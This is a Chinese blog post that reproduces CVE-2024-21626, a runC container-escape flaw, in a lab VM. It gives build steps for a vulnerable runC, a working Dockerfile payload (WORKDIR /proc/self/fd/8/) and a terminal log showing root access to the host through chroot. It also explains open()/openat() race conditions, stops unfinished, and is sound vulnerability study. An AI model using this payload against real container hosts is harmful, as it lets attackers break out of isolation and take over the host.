---
title: CVE-2024-21626
date: 2025-03-03 18:27:00
tags: [Web, 渗透]
categories: 渗透
---

研究一下 Docker 的 CVE。

<!--more-->

## 前置知识

### 什么是 Docker

相信读这篇文章的大部分人都知道 Docker 是什么，但不一定能背出这种八股问题。
Deepseek 给出的回答是：Docker 是一种开源的容器化平台，用于快速构建、打包、部署和运行应用程序。它的核心思想是通过容器技术，将应用及其依赖环境（如库、配置等）打包成一个轻量级、可移植的镜像，从而实现 **“一次构建，处处运行”**。

### 什么是 runC

runC 是一个开源的容器运行时，是 Docker 的一部分，用于创建和运行容器。runC 是一个轻量级的工具，它实现了 [OCI](https://opencontainers.org/) 标准，可以在任何 OCI 兼容的容器运行时中使用。

## 复现

用 WSL 一直复现不出来，WSL 的情况很奇怪，`docker version` 能看到版本是老的，但是直接执行 `runc` 又没有这条命令。
实在不行了，换 VMWare 里搞搞
新建了个 Ubuntu 20.04 的虚拟机，选择 Minimal Installation，不要浏览器之类乱七八糟的东西。
学校内网有镜像站，直接换个源起飞。

```bash
sudo rm /etc/apt/sources.list   # 要备份就 mv 一下，因为我是新机，就直接删了
sudo nano /etc/apt/sources.list
```

粘贴后 `Ctrl + O` 保存，`Ctrl + X` 退出。

```bash
sudo apt update
sudo apt upgrade
```

这里默认没带 SSH，执行 `sudo apt install openssh-server` 装一下。不然不太习惯 Ubuntu 自带的终端。
然后安装 Docker

```bash
sudo apt install docker.io
```

`docker version` 看一下版本，runc 是新的，还是得自己编译老版本替换。

```bash
git clone https://github.com/opencontainers/runc
cd runc
git checkout v1.1.0-rc.1
sudo apt install -y build-essential libseccomp-dev   # 不然会报错
make
sudo rm -rf $(which runc)
sudo make install
sudo systemctl restart docker
```

这个新机 make 和 go 都没有，中途也装了一下，不提。
写一个 Dockerfile 如下：

```Dockerfile
FROM ubuntu
 
# Sets the current working directory for this image
WORKDIR /proc/self/fd/7/
```

执行 `docker build . -t test`，这里 `-t` 的意思是 tag。
再执行 `docker run --rm -it test bash`，这里 `--rm` 可以让容器停止后自动删除容器文件系统，避免手动清理临时容器，一般用于测试，`-it bash` 意思是起一个交互式的 bash shell。
说是可能要多执行几次才会成功，但是执行了几十次都不行，把 Dockerfile 的 `WORKDIR` 改成 `WORKDIR /proc/self/fd/8/` 就可以了。

OHHHHHHHHH!!!!!!!!!
以下是命令执行记录：

```bash
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@6e9ec0c97b8f:.# cd ../..
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@6e9ec0c97b8f:../..# ls
block  bus  class  dev  devices  firmware  fs  hypervisor  kernel  module  power
root@6e9ec0c97b8f:../..# pwd
../..
root@6e9ec0c97b8f:../..# cd ..
root@6e9ec0c97b8f:../../..# ls /
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@6e9ec0c97b8f:../../..# ls /home
ubuntu
root@6e9ec0c97b8f:../../..# docker ps
bash: docker: command not found
root@6e9ec0c97b8f:../../..# chroot .
# ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
# docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
6e9ec0c97b8f   test      "bash"    4 minutes ago   Up 4 minutes             admiring_gates
# whoami
root
# exit
root@6e9ec0c97b8f:../../..# exit
exit
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test
[sudo] password for kali:
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@21b173949eee:.# exit
exit
kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@d5e014a9425b:.#
```

这里简单提下，`chroot` 是改变根目录的命令，`chroot .` 就是把当前目录作为根目录，这样操作起来就跟宿主机一样了。

## 原理

还是得先普及几个概念。

### 什么是 openat()

这是 DeepSeek 的回答：

> openat() 是 Linux 系统中的一个系统调用，用于以相对路径的方式打开文件或目录，**旨在解决传统 open() 函数在多线程或路径变化场景下的竞争条件问题**。

首先我们知道 `open()` 是一个关于文件的系统调用，那么就可以大概理解成 `openat()` 是 `open()` 的一个改良。

#### 关于 open() 函数的条件竞争问题

这个属于题外话，感兴趣的朋友可以看一下，不感兴趣的直接往下过就行。
_条件竞争有些情景也叫竞态条件，可以大致理解成一回事。_
我们可以用一个简单的例子来说明这个问题，先在 `/tmp/dir1` 和 `/tmp/dir2` 下分别创建一个文件 `test.txt`，命令如下：

```bash
mkdir -p /tmp/dir1 /tmp/dir2 && \
echo "This is /tmp/dir1/test.txt" > /tmp/dir1/test.txt && \
echo "This is /tmp/dir2/test.txt" > /tmp/dir2/test.txt
```

然后写一个简单的 C 代码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

const char *filename = "test.txt";

// 线程 A：循环切换当前工作目录
void *switch_directory(void *arg) {
    while (1) {
        // 在三个目录之间来回切换
        chdir("/tmp/dir1");
        chdir("/tmp/dir2");
        chdir("/var");
    }
    return NULL;
}

// 线程 B：尝试打开文件
void *open_file(void *arg) {
    while (1) {
        // 尝试以只读方式打开文件（假设文件存在于某目录下）
        int fd = open(filename, O_RDONLY);
        if (fd == -1) {
            perror("open failed");
        } else {
            printf("open succeeded\n");
            // 输出文件内容
            char buf[1024];
            ssize_t n = read(fd, buf, sizeof(buf));
            if (n == -1) {
                perror("read failed");
            } else {
                buf[n] = '\0';
                printf("read: %s\n", buf);
            }
            close(fd);
        }
        usleep(1000000); // 短暂延迟
    }
    return NULL;
}

int main() {
    pthread_t t1, t2;
    pthread_create(&t1, NULL, switch_directory, NULL);
    pthread_create(&t2, NULL, open_file, NULL);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    return 0;
}
```

编译并运行这个程序：

```bash
gcc -o race_condition_test race_condition_test.c -lpthread && ./race_condition_test
```

可以看到执行结果如下：

```plain
open succeeded
read: This is /tmp/dir2/test.txt

open failed: No such file or directory
open failed: No such file or directory
open succeeded
read: This is /tmp/dir2/test.txt

open succeeded
read: This is /tmp/dir2/test.txt

open failed: No such file or directory
open succeeded
read: This is /tmp/dir1/test.txt

open succeeded
read: This is /tmp/dir1/test.txt

open succeeded
read: This is /tmp/dir2/test.txt

open failed: No such file or directory
```

读者稍加理解上以代码和运行结果就可以发现，`open()` 函数容易受到 CWD（Current Working Directory，当前工作目录）的影响，若多个线程同时调用 `chdir()` 修改全局 CWD，并依赖相对路径调用 `open()`，其他线程的后续 `open()` 操作就可能因 CWD 被意外修改而解析到错误路径。

这个时候 `openat()` 就来了，man 官网上关于 `open` 家族的函数的描述如下：

```c
#include <fcntl.h>

int open(const char *pathname, int flags, ...
            /* mode_t mode */ );

int creat(const char *pathname, mode_t mode);

int openat(int dirfd, const char *pathname, int flags, ...
            /* mode_t mode */ );

/* Documented separately, in openat2(2): */
int openat2(int dirfd, const char *pathname,
            const struct open_how *how, size_t size);
```

可以看到，`openat()` 函数比 `open()` 多了一个 `dirfd` 参数，这个参数是一个文件描述符，用于指定相对路径的起始目录，而不是依赖全局 CWD，这样就避免的 `open()` 函数的条件竞争问题。
demo 如下：

```c
int dirfd = open("/home", O_RDONLY | O_DIRECTORY);
int fd = openat(dirfd, filename, O_RDONLY);
```

具体的对比测试就不做了，反正肯定可以解决上面的问题的（不然搞来干嘛 hhh

#### openat() | openat(2) | openat2() | openat2(2) 的区别

在搜索的过程中，这几个玩意都有出现，给我绕晕了。
吐槽一下，nitroc 的文章里面一会 `openat(2)` 一会 `openat2(2)` 的，一切换成他的英文版本又全是 `openat2(2)`，不是哥们你能不能好好写文章，有点逆天了。
这块问了下 DeepSeek，然后自己试了一下，大概得出的结论如下：
先说 `openat()` 和 `openat2()`，首先上面的文档比较明显地看到 `openat()` 和 `openat2()` 在参数上的区别，`openat()` 采用的还是传统的 flags，而 `openat2()` 采用的是 `struct open_how` 结构体，可以说 `openat2()` 是 `openat()` 的一个扩展。

// To be continued...

## 参考

<https://nitroc.org/posts/cve-2024-21626-illustrated>
<https://www.manjusaka.blog/posts/2024/02/10/CVE-2024-21626/index.html>
<https://blog.csdn.net/qq_42931917/article/details/131468557>
<https://man7.org/linux/man-pages/man2/open.2.html>
